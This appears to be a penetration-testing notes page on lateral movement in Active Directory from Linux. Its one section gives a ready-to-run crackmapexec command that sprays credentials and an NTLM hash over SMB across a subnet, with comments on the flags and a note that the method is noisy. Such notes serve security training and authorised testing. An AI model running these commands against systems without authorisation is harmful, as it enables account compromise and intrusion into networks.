---
title: Lateral Movement in Active Directory from Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# Lateral Movement in Active Directory from Linux
[Index of Active Directory](active-directory.md)

[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Active directory: connecting to other hosts](active-directory-connections.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)



##  Spraying password technique in the domain with crackmapexec

```
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```

**This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth.** 

